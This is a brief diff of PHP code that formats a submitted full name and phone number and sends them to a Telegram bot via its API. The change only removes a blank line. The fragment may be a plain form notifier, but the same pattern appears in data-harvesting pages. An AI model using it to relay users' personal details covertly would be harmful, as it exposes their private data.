@@ -14,7 +14,6 @@ $message = "
 - Nama Lengkap : ".$Nama."
 - Nomer Telepon : ".$Nomor."
  ";
-
 function sendMessage($id_telegram, $message, $id_botTele) {
     $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=markdown&chat_id=" . $id_telegram;
     $url = $url . "&text=" . urlencode($message);
